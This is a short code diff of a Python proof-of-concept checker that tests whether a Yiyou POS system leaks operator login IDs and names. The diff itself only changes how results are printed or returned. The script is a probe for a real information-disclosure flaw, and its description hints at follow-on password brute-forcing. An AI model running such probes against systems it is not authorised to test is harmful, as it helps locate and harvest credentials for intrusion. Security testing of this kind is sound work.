@@ -8,8 +8,8 @@ description: 依友POS系统用户名列表泄露，且系统无验证码，可�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class yeu_disclosure_uid_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class yeu_disclosure_uid_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"OperID" in req.text and r"OperName" in req.text:
-                cprint("[+]存在依友POS系统登陆信息泄露漏洞...(中危)\tpayload: "+vulnurl, "yellow")
+                return "[+]存在依友POS系统登陆信息泄露漏洞...(中危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = yeu_disclosure_uid_BaseVerify(sys.argv[1])
     testVuln.run()
